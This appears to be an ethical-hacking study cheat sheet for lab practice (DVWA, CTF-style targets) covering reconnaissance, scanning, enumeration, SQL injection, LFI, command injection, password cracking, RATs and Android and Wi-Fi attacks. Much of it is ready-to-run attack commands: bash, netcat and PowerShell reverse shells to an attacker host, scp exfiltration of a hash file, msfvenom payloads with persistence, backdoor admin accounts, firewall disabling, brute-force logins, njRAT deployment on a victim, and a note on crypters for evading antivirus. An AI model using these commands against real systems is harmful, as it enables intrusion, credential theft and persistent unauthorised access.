## Resources {#resources}
[Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)

## Reconnaissance {#reconnaissance}

### Web-Based Tools
  - [Tor Browser](https://www.torproject.org/download/)
  - [Google Search Engine](https://ahrefs.com/blog/google-advanced-search-operators/)
  - [Netcraft](https://searchdns.netcraft.com)
  - [Shodan](https://www.shodan.io/)
  - [Censys](https://censys.com/data-and-search/)

### Command-Line Tools
  - Sublist3r | `sublist3r -d domain -b all` | Subdomain enumeration |
  - TheHarvester | `theharvester -d domain -n linkedin` | Email and subdomain gathering |
  - Sherlock | `sherlock username` | Username reconnaissance |
  - Photon | `photon -u URL` | Web crawler and data extractor |
  - HTTrack | `httrack http://example.com` | Website mirroring |
  - Recon-ng | `recon-ng` | Full-featured reconnaissance framework |

## Network Scanning {#network-scanning}

### Online Resources
- [Central Ops .net](https://centralops.net/co/)
- [OSINT framework](https://osintframework.com/)
- [NMAP cheatsheet](nmap.md)

### SX Tool
```bash
# Network scanning tool for ARP, TCP & UDP
sx arp 10.10.1.0/24
sx arp 10.10.10.1/24 --json | tee arp.cache  # Output to file
```

### GUI Applications
- Angry IP Scanner: Host discovery for any OS
- Zenmap: Nmap's graphical interface tool
- Uniscan:
  - GUI: Launch uniscan-gui
  - CLI: `unicornscan 10.10.1.10 -Iv`
- Metasploit payloads

### Additional Tools
```bash
# Discover devices
netdiscover -i eth0

# Enumeration
netstat -a 10.10.10.10      # Netstat enumeration netbios
snmp-check 10.10.10.10      # Extract users from netbios
masscan -e tun0 -p1-65535 -rate=1000 <ip>
```

## Essential Ports {#essential-ports}

| **Port**  | **Service**                         | **Exploitation & Enumeration Insights** | **Insight (OS/Machine Identification)** |
|-----|-------------|----------------------------------------------|-------------------------------------|
| **21**   | FTP                            | 🔹 Check for **anonymous login** (`nmap --script ftp-anon`). <br> 🔹 Exploit **weak credentials**. | Open source vs. proprietary FTP servers hint at OS. |
| **22**   | SSH                            |🔹 **Brute-force weak credentials** (`hydra -L users.txt -P passwords.txt ssh://<IP>`). | Common on **Linux**, macOS, and network devices. |
| **23**   | Telnet                         | 🔹 **Legacy service** → Credentials **sent in cleartext**. <br> 🔹 **Intercept with Wireshark**, or brute-force (`hydra -P pass.txt telnet://<IP>`). |old Windows, Unix |
| **25**   | SMTP (Mail)                    |🔹 Enumerate users (`nmap --script smtp-enum-users`). <br> 🔹 Open relay testing (`nmap --script smtp-open-relay`). |Email servers, typically **Linux-based** |
| **53**   | DNS                            | 🔹 **Used in Active Directory (Windows DCs)**. <br> 🔹 If misconfigured, **zone transfer possible** (`dig axfr @<IP>`). |BIND service suggests **Linux**, Microsoft DNS hints at **Windows Server**. |
| **80/443** | HTTP/HTTPS                     | 🔹 **Web servers** (Apache, Nginx, IIS). <br> 🔹 **SQLi/XSS/LFI scanning** (`sqlmap -u "http://<IP>/page?id=1"`). <br> 🔹 **Directory brute-force** (`gobuster dir -u http://<IP>`). | Apache/Nginx on Linux, IIS on Windows |
| **110/995** | POP3/POP3S (Mail)             | 🔹 Email retrieval. **Can be brute-forced**. |- |
| **143/993** | IMAP/IMAPS (Mail)             | 🔹 Email storage, **potential credential leaks**. |- |
| **135**  | RPC                             | 🔹 **Windows-only** → Used in **DCE-RPC & Active Directory**. <br> 🔹 **Exploitable via MS08-067 (EternalBlue)**. |- |
| **137-139** | NetBIOS                      | 🔹 **Windows-only** → Used for **file sharing & AD authentication**. <br> 🔹 **Enumerate shares (`smbclient -L //<IP> -U ""`)**. |- |
| **389/636** | LDAP/LDAPS (Active Directory) | 🔹 **Windows Domain Controllers (DCs)**. <br> 🔹 **Enumerate AD users (`ldapsearch -h <IP> -x -s base`)**. |- |
| **445**  | SMB                             | 🔹 **Windows-only** → Used for **file sharing & AD authentication**. <br> 🔹 Exploit with **EternalBlue (MS17-010)** (`use exploit/windows/smb/ms17_010_eternalblue`). |- |
| **3268/3269** | Global Catalog (Active Directory) | 🔹 **Used for multi-domain queries**. <br> 🔹 Can be enumerated via LDAP queries. |- |
| **3306** | MySQL                           |🔹 Check for **default/root credentials** (`mysql -u root -p`). | Mostly found on **Linux servers** |
| **3389** | RDP (Remote Desktop)            | 🔹 **Windows-only** → Exploit **weak credentials** (`hydra -L users.txt -P pass.txt rdp://<IP>`). <br> 🔹 If vulnerable, use **BlueKeep (`CVE-2019-0708`)**. |- |
| **500/4500** | IPSec (VPN)                  | 🔹 **Used in VPN services**. <br> 🔹 Can be **brute-forced for PSK (Pre-Shared Keys)**. |- |
| **5060/5061** | SIP (VoIP)                   | 🔹 **VoIP services** → Can be **brute-forced for credentials** (`svwar -D -m INVITE -u <user> <IP>`). | found on **Linux-based PBX servers** (Asterisk, FreePBX). |
| **161/162** | SNMP (Network Devices)       | 🔹 **Used in Cisco routers, switches, and IoT devices**. <br> 🔹 Check for **public/private community strings (`nmap --script snmp-brute`)**. | - |
| **8080/8443** | Alternate HTTP/S            | 🔹 Found on **Tomcat servers, Admin panels**. <br> 🔹 **Tomcat Default Creds:** (`admin:admin`). | Tomcat = **Linux**, IIS = **Windows**. |
| **4444** | Metasploit Listener             | 🔹 **If open, likely indicates a reverse shell**. <br> 🔹 Run `nc -nv <IP> 4444` to connect. | -|
| **5432** | PostgreSQL                      |🔹 Exploit weak credentials (`nmap --script pgsql-brute`). | Database mostly found on **Linux servers**. |
| **5985/5986** | WinRM (Windows Remote Mgmt) | 🔹 **Windows-only** → Used for **PowerShell Remoting**. <br> 🔹 Brute-force login using `evil-winrm -i <IP> -u user -p password`. | -|
| **5555** | Android Debug Bridge (ADB)      | 🔹 **Android devices** in debug mode → Can be exploited for remote access. <br> 🔹 If open, run: `adb connect <IP>:5555 && adb shell`. | -|

## Enumeration {#enumeration}

### SMB (Port 445)
```bash
# List shares, Finds shared folders on a Windows/Linux machine
nmap --script smb-enum-shares -p 445 <IP>
#If the target allows anonymous access, you'll see default shared folders (C$, IPC$, ADMIN$)
smbclient -L //<TARGET-IP> -U anonymous -N

# Access share
smbclient //<TARGET-IP>/DVWA -U anonymous
smb: \> get uploads/hash.txt

enum4linux -U 10.10.60.11     #U → users enumeration
crackmapexec smb <IP> --users
smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"        #x → command
```

### FTP (port 21)
```bash
  ftp <TARGET-IP>
  
  #Try logging in with anonymous credentials:
  User: anonymous
  Password: (leave blank)
#OR hydra -l user -P rockyou.txt ftp://<IP>

  ftp> ls
  #Navigate to DVWA/uploads/ and get the file:
  ftp> cd DVWA/uploads/
  ftp> get hash.txt
```

### RDP
```js
  #find out if service is running with nmap/metasploit(rdp_scanner)
  #brute force with hydra
  #use xfreerdp for gui login or use remmina
```
  
### AD Explorer (LDAP)
```js
  Its an application or try with nmap
  nmap -p 389 –script=ldap-brute –script-args ldap.base=’”cn=users,dc=CEH,dc=com”’ 10.10.1.22
```
### Additional enumeration

#### Directory Enumeration
```bash
gobuster dir -u 10.10.0.1 -w /usr/share/wordlists/common.txt -t 50 -x php,html,txt -q
  #dir : directory listing        #-u : host
  #-w : wordlists        #-t : threads int / Number of concurrent threads (default 10)
  #-x : enumerate hidden files htm, php      #-q : –quiet / Don’t print the banner and other noise
```

#### WordPress Enumeration
```bash
wpscan --url https://localhost.com --passwords=wordlist.txt
wpscan -u 10.10.10.10 -e u vp
wpscan -u 10.10.10.10 -e u --wordlist path/rockyou.txt
 #-e : enumerate      #-u : enumerate usernames       #-vp : vulnerable plugins
```

#### misc
```bash
# SNMP Check, #after UDP scan with nmap
snmp-check 10.10.1.22

# NetBIOS
nmap --script nbstat.nse <IP>

# Wordlist Generation
cewl -w wordlist -d 2 -m 5 http://wordpress.com
```

## Vulnerability Scanning {#vulnerability-scanning}

- OpenVAS/Greenbone
  ```bash
  apt install openvas -y
  gvm-setup
  gvm-start
  ```
- Tenable Nessus: `systemctl start nessusd`
- NIST
- CVE.org
- Nikto
  ```bash
  nikto -h <TARGET-IP>                                    # Basic scan
  nikto -h <TARGET-IP> -p 443,8080,8443                  # Specific ports
  nikto -h https://<TARGET-IP>                           # HTTPS scan
  nikto -h <TARGET-IP> -useragent "Mozilla/5.0"          # Browser mimicking
  nikto -h <TARGET-IP> -o scan_results.txt               # Save output
  nikto -h <TARGET-IP> -o results.html -Format html      # HTML output
  nikto -h <TARGET-IP> -useproxy http://127.0.0.1:8080   # Proxy scan
  nikto -h <TARGET-IP> -mutate 2 -mutate-options my_wordlist.txt          #custom payload
  nikto -h url -Cgidirs all           #to scan all known CGI directories 
  nikto -h <TARGET-IP> -Tuning <value>                   # Specific vulnerabilities
      <value>  → 0 (default), 1,2 (Interesting & index files) 4,5,9 (XSS &SQLi) , 6,7 (RCE & File Upload), 3 (Misconfig), 9(Full or aggressive)
  ```

## Steganography {#steganography}

### Steghide
```bash
# Extract hidden file
steghide extract -sf new.jpeg

# Embed file
steghide embed -ef abc -cf web.jpeg -sf new.jpeg -e none -p 123
#ef = embedded file      #abc is a text file in this example
    #cf = cover file      #web.jpeg is a image file
    #sf = stegno file      #new.jpeg is a stego created new file
    #e = encryption
    #p = password
```

### SNOW
```bash
# Extract hidden message
SNOW.EXE -C -p 1234 output.txt

# Conceal message
SNOW.EXE -C -p 1234 -m "hidden message" input.txt output.txt
```

### misc
- openstego GUI tool (https://github.com/syvaidya/openstego/releases)
- stegosuite

## Web Exploitation {#web-exploitation}

### SQL Injection

#### Detection and Retrieval
- Comment indicators: `-- ` (MySQL), `#` (Oracle/MS/PostgreSQL)
- Basic tests:
  - `condition'+OR+1=1--`
  - `' ORDER BY 1--` `' ORDER BY 2--`...until error
  - `' UNION SELECT NULL--` `' UNION SELECT NULL,NULL--` ..
  - comparison on queries of databases types](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### Version Detection
```sql
-- Microsoft, MySQL
SELECT @@version

-- Oracle
SELECT * FROM v$version

-- PostgreSQL
SELECT version()

-- example use
' UNION SELECT @@version--
```

#### Database Enumeration
```sql
-- List tables
SELECT * FROM information_schema.tables

-- List columns
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

#### Blind SQLi
````sql
In Cookies, If suppose we found users' as a table and administrator' as a username with multiple boolean conditions with burp repeater, then with intruder we can cluster bomb:  

  vz9' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;
````

### SQLMap
[SQLmap -h](sqlmap.md) 🔗
```bash
# Basic scan
sqlmap -u http://<ip>/administrator.php --forms --dump
sqlmap -u <ip> --forms --dump

# Extract database
sqlmap -u <url> --cookie <cookie> --dbs

# Extract columns
sqlmap -u http://localhost.com/hey.php?artist=1 -D databasename --T artists --columns

# Extract data
sqlmap -u http://localhost.com/hey.php?artist=1 -D tabla --T artist --C adesc,aname,artist_id --dump
```

### Local File Inclusion (LFI)
```html
http://<TARGET-IP>/vulnerable.php?file=../../DVWA/uploads/hash.txt

<!--Or try Windows-style LFI:-->
http://<TARGET-IP>/vulnerable.php?file=../../../../../../../../windows/system32/drivers/etc/hosts

<!--If the app is filtering ../, use URL encoding:-->
http://<TARGET-IP>/vulnerable.php?file=..%2F..%2FDVWA/uploads/hash.txt
```

### DVWA
Basic Commands
```bash
  ; whoami
  && whoami #If successful, it should return the current user (e.g., www-data in Linux).

#List Files & Directories
  ; ls -la    #linux
  && dir    #windows

#Read Files & user info (Sensitive Info)
  ; cat /etc/passwd    #linux
  ; cut -d: -f1 /etc/passwd      #View Only Usernames in above
  && type C:\Windows\System32\drivers\etc\hosts      #windows
  net user     #View All Users in windows
  query user    #View Active Logged-in Users
  net user /domain    #View Domain Users
````
Get the file:
- Try Accessing via a Web Browser (If DVWA Has File Access)
````js
  http://<TARGET-IP>/DVWA/uploads/hash.txt
  //If the file is accessible, you can download it directly // wget
````
- LFI via web [browser](#web-explotation)
- using [smb](#enumeration)
- using [ftp](#enumeration)
- Windows:
    If you have Command Injection or an RCE shell, use:
    ````bash
    type C:\DVWA\uploads\hash.txt    #CMD (Windows)
    Get-Content C:\DVWA\uploads\hash.txt     #powershell
    scp C:\DVWA\uploads\hash.txt attacker@<ATTACKER-IP>:/home/kali/     #To transfer the file to your system
    
    meterpreter > download C:\\DVWA\\uploads\\hash.txt .   #If you have Meterpreter, download the file
    ````
Check Network & Connections
```bash
  #Linux:
  ; ifconfig
  ; netstat -an
  #Windows:
  && ipconfig
  && netstat -an
```
Get a Reverse Shell (Full Access)
If outbound connections are allowed, you can get a reverse shell, with [netcat](#netcat-reverse-shell)
```bash
  #If nc is unavailable, try:
  ; bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1
  
  #Windows Reverse Shell, set up listener on Kali:
  nc -lvnp 4444
  #Then inject:
  && powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Create a New User
If you have enough privileges, add a new user for persistent access.
```bash
  ; useradd -m hacker && echo "hacker:password" | chpasswd         #Linux
  
  #windows
  && net user hacker P@ssw0rd /add
  && net localgroup administrators hacker /add
```
Disable Firewalls
```bash
  ; iptables -F      #linux
  && netsh advfirewall set allprofiles state off       #windows
```
Metasploit (If You Have a Shell)
If you have Meterpreter access:
```bash
  meterpreter > getuid
  #List all users:
  meterpreter > run post/windows/gather/enum_users
  meterpreter > help
```
> How to Fix the Vulnerability?
> > Sanitize input: Use escapeshellcmd() and escapeshellarg().  
> > Whitelist commands: Only allow specific inputs.  
> > Use prepared statements: Avoid direct execution of user input.  

## System Hacking {#system-hacking}

### Netcat Reverse Shell
```bash
# Attacker
nc -lvnp 4444

# Victim
nc -e /bin/bash <ATTACKER-IP> 4444
```

### Hydra
```bash
# SSH
hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:192.168.0.100
hydra -l username -P passlist.txt 192.168.0.100 ssh

# FTP
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
#If the service isn't running on the default port, use -s
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221

# Telnet
hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet

# Web Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
```

### RATs
- Identify Hidden Running Services:  
  `Get-Service | Where-Object {$_.Status -eq "Running"}`    #Windows  
  `ps aux | grep -i "nc\|meterpreter\|rat" `               # Linux  
- Gaining access via meterpreter then:  
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 -f exe > rat.exe
  msfconsole
  ~ use exploit/multi/handler
  ~ meterpreter > sysinfo   #or getuid   #user privilege or hashdump  #Extract password hashes
  ~ meterpreter > persistence -U -i 5 -p 4444 -r <ATTACKER-IP>  # Maintain access
  ```
- Applications like njRAT, DarkComet, QuasarRAT  
  - Download and install njRAT (file from github blackall9) 
  - Start njRAT application with default port number and Build then enter attacker IP
  - Check required checkbox’s on right
  - Have that Executed on victim machine
  - Attacker will get the session active in njRAT console

### Theef
  > Server exe need to be run on victim and client exe on Attacker

### Malware Analysis
- [Virus Total](https://www.virustotal.com/gui/home/search)
- [Hybrid Analysis](https://www.hybrid-analysis.com/)
- Antiscan.me
- DIE Tool `die /path/to/binary.exe` or `diec /path/to/binary`

 > swazycrypter encryptes the application with more complexity/hash to avoid antivirus to find it.

## Cryptography {#cryptography}

### Password Cracking
#### To find the password of a ZIP file
```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <zipfile.zip>
  #-v → Verbose mode (show progress).
  #-u → Tries to unzip to verify correct password.
  #-D → Dictionary attack mode.
  #-p rockyou.txt → Uses RockYou wordlist (common passwords).
  #with john

zip2john <zipfile.zip> > hash.txt        #First, extract the ZIP hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        #Then, crack it using rockyou.txt
hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force       #mode 13600 → ZIP, 13721 → SHA-512 + XTS
john --show hash.txt      #To see the cracked password

#If the ZIP uses weak encryption (pkzip format), you might be able to extract files without a password:
unzip -P "" <zipfile.zip>
```

#### Online Tools
| **Website** | **Supports (MD5, SHA1, NTLM, etc.)** | **Notes** |
|-------------|---------------------------------|-----------|
|[CrackStation](https://crackstation.net/) | MD5, SHA1, SHA256, SHA512, NTLM | Large precomputed database (rainbow tables) |
|[Hashes.com](https://hashes.com/) | MD5, SHA1, NTLM, MySQL, bcrypt | Free + premium cracking, community-driven |
|[OnlineHashCrack](https://www.onlinehashcrack.com/) | MD5, SHA1, NTLM, WPA, bcrypt | Supports **offline cracking** (upload files) |
|[MD5 Decrypt](https://md5decrypt.net/) | MD5, SHA1, NTLM, MySQL | Fast lookup for common hashes |
|[CMD5](https://www.cmd5.com/) | MD5, SHA1, SHA256, MySQL | Good for **NTLM & MySQL** hashes |

#### Local Tools
```bash
# Identify hash
hashid hash.txt
hashcat --identify hash.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt        #Check results

# Crack with Hashcat
hashcat -m <HASH_MODE> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m <HASH_MODE> -a 3 hash.txt ?a?a?a?a?a?a     // (Adjust ?a?a?a... for password length.)      #If no dict matches
#mode 13600 → ZIP, 13721 → SHA-512 + XTS

# Decode Base64 (If Encoded)
cat hash.txt | base64 -d
```

#### GUI Applications
- Hash Calc (window based tool)
- MD5 Calculator (window based – git/sourceforage)
- Cryptoforge
  - Not a free application
  - We can lock/encypt a file/folder with the password
- Encode/Decode data with BCTTextEncoder
  - Download BCTextEncoder from the official site or trusted sources.
  - Run BCTextEncoder.exe (No installation required).
  - In the "Input Text" box, enter the message you want to encrypt.
  - Check "Use Password" and enter a strong password.
  - Click "Encode".
  - The encrypted text appears in the "Output Text" box.
  - Paste the encrypted message into the "Input Text" box.
  - Enter the decryption password (same as the one used for encryption).
  - Email or send the encrypted text securely.

### Disk Encryption
- Bitlocker
- VeraCrypt (https://veracrypt.eu/en/Downloads.html)
  1. Create volume
  2. Choose container type
  3. Select encryption algorithm
  4. Set size and password
  5. Move the cursor for more complexity of encryption
  6. Finish the setup
  7. Now agin start the veracrypt application and select the output file and we can attach/mount it as a 'New Volumn'.

## Android Hacking {#android-hacking}

### ADB (Android Debug Bridge)
```bash
# android victim must be in debug-mode, following are Setup
apt-get update
sudo apt-get install adb -y

# Usage
adb devices -l
adb connect <ip>
adb shell
adb pull sdcard/test.txt /home/user/Desktop
```

## Wireless Hacking {#wireless-hacking}

```bash
# Crack wireless capture
aircrack-ng Credmapwifi.cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> Credmapwifi.cap
```

### Phonesploit
1. Install from GitHub
2. Run: `python3 phonesploit.py`
3. Use options to view/connect/download
